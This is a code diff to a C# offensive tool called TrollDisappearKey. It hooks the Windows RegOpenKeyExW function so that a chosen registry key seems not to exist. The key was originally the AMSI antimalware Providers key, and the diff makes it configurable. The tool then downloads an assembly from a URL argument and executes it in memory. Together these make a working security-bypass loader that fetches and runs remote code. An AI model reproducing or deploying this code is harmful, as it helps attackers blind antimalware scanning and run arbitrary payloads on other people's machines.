@@ -27,6 +27,7 @@ public static class TrollDisappearKey
     static public byte[] originalBytes = new byte[12];
     static public byte[] hookBytes = new byte[12];
     static public int counter = 0;
+    static public string thekey = "";
 
 
     public static void DisappearKey()
@@ -47,17 +48,17 @@ public static class TrollDisappearKey
         {
             Marshal.Copy(originalBytes, 0, targetAddr, hookBytes.Length);
 
-            if (lpSubKey == @"Software\Microsoft\AMSI\Providers")
+            if (lpSubKey == thekey)
             {
                 counter = counter + 1;
-                return RegOpenKeyExW(hKey, @"Software\Microsoft\AMSI\Providers ", ulOptions, samDesired, out phkResult);
+                return RegOpenKeyExW(hKey, thekey + " ", ulOptions, samDesired, out phkResult);
             }
             return RegOpenKeyExW(hKey, lpSubKey, ulOptions, samDesired, out phkResult);
 
         }
         finally
         {
-             if (counter == 0) { Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length); }
+            if (counter == 0) { Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length); }
         }
     }
 
@@ -68,12 +69,16 @@ public static class TrollDisappearKey
         ServicePointManager.Expect100Continue = true;
         ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
 
+        thekey = args[2];
+
         //call the function to install the hook which essentially makes lpSubKey disappear
         //if first argument is passed as disabled, hook will not trigger
         if (args[1].Split(',')[0] != "disable")
         {
             DisappearKey();
         }
+
+        
 
         //standard assembly load .exe and call main with args
         ExecuteAssembly(new WebClient().DownloadData(args[0]), args[1]);
@@ -100,4 +105,3 @@ public static class TrollDisappearKey
         }
     }
 }
-
